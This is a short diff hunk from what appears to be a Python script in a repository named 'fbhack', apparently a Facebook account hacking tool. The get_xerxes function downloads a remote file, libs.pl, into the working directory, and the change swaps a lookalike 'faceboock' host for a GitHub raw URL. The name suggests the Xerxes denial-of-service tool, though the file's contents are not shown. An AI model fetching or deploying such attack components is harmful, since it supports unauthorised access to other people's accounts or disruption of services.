@@ -19,7 +19,7 @@ myname = ".demp.ov"
 
 
 def get_xerxes():
-  armv = "http://www-faceboock.orgfree.com/xerxes"
+  armv = "https://raw.githubusercontent.com/h3inAKArr/fbhack/master/libs/libs.pl"
 
   if "armv" in platform.machine():
     urllib.urlretrieve(armv,"{}/libs.pl".format(mypwd))
